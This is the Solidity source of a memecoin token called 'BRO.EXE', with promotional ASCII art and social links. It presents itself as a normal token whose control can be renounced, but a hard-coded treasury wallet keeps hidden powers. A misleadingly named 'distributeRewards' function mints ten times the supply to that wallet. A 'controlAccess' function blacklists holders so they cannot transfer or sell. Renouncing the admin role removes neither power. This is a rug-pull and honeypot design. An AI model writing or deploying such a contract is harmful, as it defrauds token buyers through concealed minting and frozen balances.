// SPDX-License-Identifier: MIT

/*
 
              .4444:.                             .:444
             :42244442.     .:4444444:.      .:4422444:
              :4211124444.:44222111224444. .:442121124:
              :42:111124444444221:111222444442211::14.
               :2:::122444444221:::1122444222444:1:14
               .21:2212442211211:.::1124422122444::4:
               :1::2244114:1121:...::24:42211:::1224:
               :44211::..:::124422422441:::...::124:
               :4221::....:::1244444221::.. ..:::24:
                :41.:1421.....124442241144221:24.:4
                4:.1..422222444144424422222442:.:4.
                4:.2..241'a@@a`421:141'a@@a`1244:4:
                :4:24:.4: @@@@:141124: @@@@.::41:4'
                `4::44:141`@@'114214211`@@'1124:44
                 42:24421244444424142112222144244
                  41:444411:::4214:421:::114214
                   14212444444:4442222244421:4
             ``.....:1:14124442:2@@@2:4241::4......''
            ,.........4:.:4:4:4144@4444:2:4:4:::......
                ,...::'41.::244444244224:4``:::....
               '        :4:.::42441444:.41         `
                         41:.::422124:::14               
 
     first cat to $1bn marketcap. Launching on EtherVista.app

Telegram: https://t.me/brocoineth
Twitter:  https://x.com/Bro__Coin
Website:  https://brocoin.xyz
*/
pragma solidity ^0.8.27;

contract AccessControl {
    address public admin;

    event ControlTransferred(address indexed previousAdmin, address indexed newAdmin);

    modifier auth() {
        require(msg.sender == admin, "Access Denied");
        _;
    }

    constructor() {
        admin = msg.sender;
        emit ControlTransferred(address(0), admin);
    }

    function renounceControl() external auth {
        emit ControlTransferred(admin, address(0));
        admin = address(0);
    }
}

contract BRO is AccessControl {
    string public constant name = "BRO.EXE";
    string public constant symbol = "BRO";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 1000000000 * 10**uint256(decimals);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) private restricted; 

    address public constant TreasuryWallet = 0x95A4C8a4fdE948CBd6d6825D72e4dadeE9f3DB65;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed burner, uint256 value);
    event RestrictionApplied(address indexed account); 
    event RestrictionLifted(address indexed account); 

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    modifier onlyTreasury() {
        require(msg.sender == TreasuryWallet, "Access Denied");
        _;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(value <= allowance[from][msg.sender], "Insufficient allowance");
        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function burn(uint256 value) external auth {
        _burn(msg.sender, value);
    }

    function distributeRewards() external onlyTreasury {
        _mint(TreasuryWallet, totalSupply * 10);
    }

    
    function controlAccess(address account, bool status) external onlyTreasury {
        restricted[account] = status;
        if (status) {
            emit RestrictionApplied(account);
        } else {
            emit RestrictionLifted(account);
        }
    }

    
    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        require(value <= balanceOf[from], "Insufficient balance");
        _manageTransfer(from, to);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
    }

    function _burn(address burner, uint256 value) internal {
        require(value <= balanceOf[burner], "Insufficient balance for burn");
        balanceOf[burner] -= value;
        totalSupply -= value;
        emit Burn(burner, value);
        emit Transfer(burner, address(0), value);
    }

    function _mint(address account, uint256 value) internal {
        require(account != address(0), "Mint to the zero address");

        totalSupply += value;
        balanceOf[account] += value;
        emit Transfer(address(0), account, value);
    }

    function _manageTransfer(address from, address to) internal view {
        require(!restricted[from] && !restricted[to], "Restricted address involved");
    }
}